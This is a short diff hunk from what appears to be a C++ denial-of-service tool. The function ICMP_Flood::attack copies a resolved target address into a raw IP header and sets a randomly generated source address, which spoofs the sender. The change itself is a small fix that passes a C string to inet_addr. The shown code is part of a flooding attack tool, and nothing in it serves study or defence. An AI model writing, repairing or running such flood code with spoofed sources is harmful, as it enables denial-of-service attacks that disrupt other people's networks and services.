@@ -35,7 +35,7 @@ void ICMP_Flood::attack(const int *id) {
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->saddr = inet_addr(Randomizer::randomIP())) == -1){
+            if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
                 continue;
             }
 
